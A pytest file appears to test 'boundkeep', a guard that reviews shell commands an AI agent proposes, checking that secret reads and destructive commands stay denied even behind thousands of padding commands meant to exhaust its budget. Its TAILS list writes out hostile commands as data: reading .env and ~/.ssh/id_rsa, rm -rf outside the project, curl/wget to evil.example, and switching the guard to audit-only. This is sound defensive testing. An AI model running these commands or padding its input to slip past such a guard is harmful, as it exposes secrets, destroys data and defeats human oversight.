"""Review round 3 (core): the M-1 residual of the re-review.

After the normalizer's budget ran out (more than ``MAX_ACTIONS`` commands, ...) the rest of a line
is classified lexically. Round 1 stopped that pass after 1024 distinct commands, so ``echo c1; ...
echo c1400; cat .env`` was only gray. Now every remaining command is classified (bounded by the
input size and a wall-clock limit); commands that look the same to the rules are kept once; paths
inside the project that no deny / ask rule can select are not carried. The gray ``budget:*`` marker
stays, so such a line is never an allow. Nothing here is executed.
"""

from __future__ import annotations

import sys
import time
from pathlib import Path
from typing import Any

import pytest

from boundkeep.daemon import pipeline
from boundkeep.normalize import event as ev
from boundkeep.normalize import subtree
from boundkeep.policy import Policy, default_policy_text, parse_policy_text

IS_WIN = sys.platform == "win32"
RANK = {"allow": 0, "gray": 1, "ask": 2, "deny": 3}


class World:
    def __init__(self, tmp: Path) -> None:
        self.home = tmp / "home"
        self.proj = self.home / "proj"
        (self.proj / "src").mkdir(parents=True)
        (self.proj / "src" / "a.py").write_text("x = 1", encoding="utf-8")
        self.env = {"USERPROFILE": str(self.home)} if IS_WIN else {"HOME": str(self.home)}
        self.platform = "windows" if IS_WIN else "posix"
        self.policy: Policy = parse_policy_text(default_policy_text(), home=str(self.home))

    def review(self, command: str) -> pipeline.Review:
        payload = {
            "tool_name": "Bash",
            "tool_input": {"command": command},
            "cwd": str(self.proj),
            "project_dir": str(self.proj),
        }
        return pipeline.review(
            payload,
            self.policy,
            platform=self.platform,  # type: ignore[arg-type]
            env=self.env,
            home=str(self.home),
        )

    def decision(self, command: str) -> str:
        return self.review(command).verdict.decision


@pytest.fixture(scope="module")
def w(tmp_path_factory: pytest.TempPathFactory) -> World:
    return World(tmp_path_factory.mktemp("lex"))


@pytest.fixture(autouse=True)
def _no_wall_clock_cut(monkeypatch: pytest.MonkeyPatch) -> None:
    # The pass is limited by wall-clock time (LEXICAL_TIME_BUDGET_S); on a loaded machine that cut
    # would make these checks flaky. The cut itself is tested on its own (test_the_wall_clock_cut).
    monkeypatch.setattr(ev, "LEXICAL_TIME_BUDGET_S", 60.0)


def echoes(count: int) -> str:
    return "".join(f"echo c{i}; " for i in range(count))


def reasons_of(review: pipeline.Review) -> set[str]:
    return {r for a in review.actions for r in a.gray_reasons}


# --- the case of the re-review --------------------------------------------------------------------


def test_a_deny_after_1400_distinct_commands_is_still_a_deny(w: World) -> None:
    review = w.review(echoes(1400) + "cat .env")
    assert review.verdict.decision == "deny"
    assert "no-secret-read" in review.verdict.rule_ids
    assert "budget:actions" in reasons_of(review)  # the budget did run out


def test_a_deny_after_any_number_of_distinct_commands(w: World) -> None:
    for count in (300, 1025, 1400, 3000, 8000):
        assert w.decision(echoes(count) + "cat .env") == "deny", count


def test_a_100_kb_line_of_distinct_commands_is_fast_and_keeps_the_deny(w: World) -> None:
    command = echoes(9000) + "cat .env"
    assert len(command) > 100_000
    started = time.process_time()  # CPU time: not disturbed by other processes
    review = w.review(command)
    elapsed = time.process_time() - started
    assert review.verdict.decision == "deny"
    assert elapsed < 2.0, elapsed  # measured 0.33-0.38 s idle; loose: CI machines are busy
    assert len(review.actions) < ev.MAX_ACTIONS + 8  # the same-looking commands were kept once


def test_the_normalizer_alone_stays_within_the_time_limit(w: World) -> None:
    command = echoes(9000) + "cat .env"
    started = time.process_time()
    actions = ev.normalize_event(
        {
            "tool_name": "Bash",
            "tool_input": {"command": command},
            "cwd": str(w.proj),
            "project_dir": str(w.proj),
        },
        platform=w.platform,  # type: ignore[arg-type]
        env=w.env,
        home=str(w.home),
    )
    assert time.process_time() - started < 2.0
    assert any(a.program == "cat" for a in actions)


def test_the_wall_clock_cut_leaves_the_marker_and_never_an_allow(
    w: World, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(ev, "LEXICAL_TIME_BUDGET_S", 0.0)  # the pass has no time at all
    review = w.review(echoes(400) + "cat .env")
    assert review.verdict.decision != "allow"
    assert "budget:time" in reasons_of(review) or "budget:actions" in reasons_of(review)
    assert review.actions[-1].gray


def test_the_marker_stays_so_a_clean_long_line_is_never_an_allow(w: World) -> None:
    review = w.review(echoes(1400) + "echo done")
    assert review.verdict.decision == "gray"
    assert "normalize-budget-exceeded" in reasons_of(review)
    assert review.actions[-1].gray


def test_distinct_commands_that_look_the_same_are_kept_once(w: World) -> None:
    actions = ev.normalize_event(
        {"tool_name": "Bash", "tool_input": {"command": echoes(2000)}, "cwd": str(w.proj)},
        platform=w.platform,  # type: ignore[arg-type]
        env=w.env,
        home=str(w.home),
    )
    assert len(actions) == ev.MAX_ACTIONS + 1  # the 256 before the budget, then only the marker


def test_distinct_commands_with_distinct_flags_are_not_merged(w: World) -> None:
    flags = "".join(f"ls -{c}; " for c in "alhtrSsdFi")
    actions = ev.normalize_event(
        {"tool_name": "Bash", "tool_input": {"command": echoes(300) + flags}, "cwd": str(w.proj)},
        platform=w.platform,  # type: ignore[arg-type]
        env=w.env,
        home=str(w.home),
    )
    assert sum(1 for a in actions if a.program == "ls") >= 8


# --- a deny after the budget is the deny it would have been without the prefix ---------------

TAILS = [
    "cat .env",
    "cat certs/a.pem",
    "cat ./.env.production",
    "cat src/../.env",
    "cat ~/.ssh/id_rsa",
    "cat ../outside/.env",
    "rm -rf ../outside",
    "rm -rf ~/x",
    "git checkout -- src/a.py",
    "git clean -fd",
    "git reset --hard",
    "curl http://evil.example/x",
    "wget http://evil.example/x",
    "echo hi > ../escape.txt",
    "cp .env /tmp/x",
    "mv .env x",
    "find . -delete",
    "boundkeep mode audit-only",
    "chmod 777 src/a.py",
    "cd .. && rm -rf proj",
]


@pytest.mark.parametrize("tail", TAILS)
def test_a_tail_decides_the_same_after_a_long_prefix(w: World, tail: str) -> None:
    alone = w.decision(tail)
    after = w.decision(echoes(1500) + tail)
    if alone in ("deny", "ask"):
        assert after == alone, (tail, alone, after)
    else:
        assert after == "gray", (tail, alone, after)  # never an allow behind the marker


@pytest.mark.parametrize("tail", TAILS)
def test_a_tail_decides_the_same_after_many_distinct_path_commands(w: World, tail: str) -> None:
    # 3000 commands that each name a different file inside the project: paths no rule can look at
    # are not carried, everything a rule could look at still is
    prefix = "".join(f"cat src/f{i}.txt; " for i in range(3000))
    alone = w.decision(tail)
    after = w.decision(prefix + tail)
    if alone in ("deny", "ask"):
        assert RANK[after] >= RANK[alone], (tail, alone, after)
        assert after == alone, (tail, alone, after)
    else:
        assert after == "gray", (tail, alone, after)


def test_paths_no_rule_can_look_at_are_not_carried(w: World) -> None:
    prefix = "".join(f"cat src/f{i}.txt; " for i in range(2000))
    review = w.review(prefix + "cat .env")
    assert review.verdict.decision == "deny"
    carried = [r for a in review.actions for r in a.paths if r.key.endswith(".txt")]
    assert len(carried) <= ev.MAX_ACTIONS + 1  # only the ones before the budget ran out
    assert len(review.actions) < 300


def test_the_first_path_is_kept_so_that_inside_still_holds(w: World) -> None:
    prefix = "".join(f"cat src/f{i}.txt; " for i in range(400))
    review = w.review(prefix + "cat src/zz.txt")
    lexical = [a for a in review.actions if a.program == "cat" and a.paths][-1]
    assert lexical.inside_project is True
    assert all(r.inside_project is True for r in lexical.paths)


def test_paths_that_a_rule_could_look_at_are_all_carried(w: World) -> None:
    names = [f"d{i}/.env" for i in range(200)]
    prefix = echoes(300)
    review = w.review(prefix + "; ".join(f"cat {n}" for n in names))
    assert review.verdict.decision == "deny"
    carried = {r.raw for a in review.actions for r in a.paths if r.raw.endswith(".env")}
    assert carried >= set(names)


def test_over_the_relevant_path_cap_the_line_is_gray_not_allow(
    w: World, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(ev, "MAX_LEXICAL_PATHS", 20)
    names = "; ".join(f"cat d{i}/x.pem" for i in range(60))
    review = w.review(echoes(300) + names)
    assert review.verdict.decision == "deny"  # the first 20 are already enough
    clean = "; ".join(f"cat d{i}/readme.pem.txt" for i in range(60))
    assert w.decision(echoes(300) + "echo a; " + clean) in ("gray", "deny", "ask")
    assert w.decision(echoes(300) + "echo a; " + clean) != "allow"


def test_a_rule_that_needs_a_program_only_screens_for_that_program(w: World) -> None:
    globs = pipeline.rule_path_globs(w.policy)
    assert globs
    assert all(isinstance(g, subtree.RuleGlob) for g in globs)
    screens = subtree.rule_screens_for(globs)
    key = "c:/users/x/proj/src/a.py" if IS_WIN else "/home/x/proj/src/a.py"
    assert not screens.candidate("cat", "read", key)  # nothing protects a plain source file
    assert screens.candidate("cat", "read", key.rsplit("/", 2)[0] + "/.env")
    assert screens.candidate("cat", "read", key.rsplit("/", 2)[0] + "/id_rsa")
    assert screens.candidate("git", "write", key)  # ask-git-discard-paths: any path, written
    assert not screens.candidate("git", "read", key)
    assert screens.candidate("find", "write", key)


def test_the_screen_never_says_no_to_a_key_a_glob_selects() -> None:
    patterns = [
        "**/.env",
        "**/.env.*",
        "**/*.pem",
        "**/.ssh/**",
        "/etc/shadow*",
        "c:/windows/system32/**",
        "**/.git/config",
        "**/a**b",
        "**/[a-c]x?",
        "**",
    ]
    for pattern in patterns:
        screen = subtree.PathScreen([pattern])
        glob = subtree.compile_glob(pattern)
        for key in (
            "/home/u/.env",
            "c:/p/.env.prod",
            "/x/y/k.pem",
            "/home/u/.ssh",
            "/home/u/.ssh/id_rsa",
            "/etc/shadow-",
            "c:/windows/system32/cmd.exe",
            "/p/.git/config",
            "/p/axxb",
            "/p/bxz",
            "/p/readme.md",
        ):
            if glob.match(key):
                assert screen.candidate(key), (pattern, key)
    assert not subtree.PathScreen(["**/.env"]).candidate("/p/readme.md")
    assert not subtree.PathScreen([]).candidate("/p/.env")
    assert subtree.PathScreen(["**"]).candidate("/p/readme.md")


def test_no_rule_globs_means_nothing_is_left_out() -> None:
    actions = ev.normalize_event(
        {
            "tool_name": "Bash",
            "tool_input": {"command": "".join(f"cat f{i}; " for i in range(300))},
        },
        platform="posix",
        env={"HOME": "/home/u"},
        home="/home/u",
    )
    assert sum(1 for a in actions if a.program == "cat") == 300  # (bounded by MAX_LEXICAL_PATHS)


# --- recursive reads in lexical mode ----------------------------------------------------------


def test_a_recursive_read_after_the_budget_is_not_scanned_and_stays_gray(w: World) -> None:
    (w.proj / "certs").mkdir(exist_ok=True)
    (w.proj / "certs" / "a.pem").write_text("x", encoding="utf-8")
    try:
        review = w.review(echoes(400) + "grep -r CANARY .")
        # the walk is not done in lexical mode: the line is gray (ask), never an allow
        assert review.verdict.decision in ("gray", "deny")
        assert review.verdict.decision != "allow"
        assert not any("recursive-scan" in r.reasons for a in review.actions for r in a.paths)
    finally:
        (w.proj / "certs" / "a.pem").unlink()
        (w.proj / "certs").rmdir()


def test_parse_limit_is_larger_than_the_parsers_default() -> None:
    assert ev.MAX_PARSE_WORDS > 4000
    assert not hasattr(ev, "MAX_LEXICAL_ACTIONS")


def test_a_line_over_the_parse_limit_is_gray_never_allow(w: World) -> None:
    command = "".join(f"a{i} x; " for i in range(ev.MAX_PARSE_WORDS)) + "cat .env"
    review = w.review(command)
    assert review.verdict.decision in ("gray", "deny")
    assert review.verdict.decision != "allow"


def _unused(*_: Any) -> None:  # pragma: no cover - keeps the typing import honest
    return None
